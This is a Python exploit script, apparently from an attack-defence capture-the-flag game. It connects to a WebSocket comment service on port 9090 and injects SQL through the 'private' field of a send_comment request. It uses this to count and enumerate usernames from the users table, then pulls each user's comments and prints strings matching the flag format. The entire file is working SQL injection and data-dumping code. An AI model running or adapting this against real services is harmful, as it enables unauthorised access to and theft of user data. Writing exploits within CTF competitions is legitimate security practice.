#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import re
import sys
import uuid

from websocket import create_connection

if len(sys.argv) < 2:
    print(f'Usage: {sys.argv[0]} HOST')
    exit(0)

ip = sys.argv[1]

url = f'ws://{ip}:9090/api/ws'

ws = create_connection(url, timeout=5)
ws.recv()

username = uuid.uuid4().hex

total_users_payload = "TRUE, (select count(username) from users), (select user_id from users where username='{}')) -- -".format(
    username)

data = json.dumps(
    {'action': 'send_comment', 'data': {'username': username, 'comment': 'payload', 'private': total_users_payload}})
ws.send(data)
ws.recv()

data = json.dumps({'action': 'get_my_comments', 'data': username})
ws.send(data)
response = json.loads(ws.recv())
total_users = int(response['Response'][0][0])

dumper = uuid.uuid4().hex

for limit in range(0,total_users):
    username_payload = "TRUE, (select username from users limit {},1), (select user_id from users where username='{}')) -- -".format(limit, dumper)
    data = json.dumps({'action': 'send_comment','data': {'username': dumper, 'comment': 'payload', 'private': username_payload}})
    ws.send(data)
    ws.recv()

data = json.dumps({'action': 'get_my_comments', 'data': dumper})
ws.send(data)
response = json.loads(ws.recv())

flags_set = set()
for user in response['Response']:
    data = json.dumps({'action': 'get_my_comments', 'data': user[0]})
    ws.send(data)
    re_flags = re.findall("[A-Z0-9]{31}=", ws.recv())
    if re_flags != []:
        for flag in re_flags:
            flags_set.add(flag)

for flag in flags_set:
    print(flag)

